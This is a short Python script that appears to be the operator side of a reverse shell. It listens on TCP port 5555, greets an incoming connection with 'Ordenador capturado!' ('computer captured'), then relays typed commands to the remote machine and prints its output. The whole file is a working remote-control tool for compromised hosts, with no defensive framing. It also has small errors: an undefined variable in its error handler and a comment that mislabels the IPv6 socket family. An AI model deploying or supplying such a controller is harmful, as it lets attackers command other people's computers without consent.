import socket
import os

os.system("clear")
#The object of the connection
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)   #parameters: AF_INET(ipv4), AF_INET(ipv6) , AF_BLUETOOTH(bluetooth)
                                                        #SOCK_STREAM: TCP , SOCK_DGRAM: UDP
                                                        
host='' 
port=5555
try:
    print("Binding socket...")
    sock.bind((host,port)) #Create the socket  IP+PORT
    print("Listening...")
    sock.listen(1)#Waits the connection, 1 request
    conn , direc=sock.accept()  #EStablish the connection in variable conn is stored all the parameter for the remote connection
    #in varible puerto there are two element, 1. the IP out ATTACKER IP.  2. the port number associated in the target IP
    #print("This is the variable conn from accept method: ", conn)
    print("Ordenador capturado!. Conexion establecida: IP: ",str(direc[0]),"Port: " ,str(direc[1]))
    
except socket.error as msg:
    print("[-] An error happened: ", error)
    conn.close()



try:
    while True:
        msg=input()
        if len(msg) > 0:
            msgENCODE=msg.encode("utf-8")
            conn.send(msgENCODE)
            mssg=conn.recv(1024)
            print(mssg.decode("utf-8"), end="")
    
except Exception as errorMSG:
    print("[-] An error happened: ", errorMSG)
    conn.close()

    

                         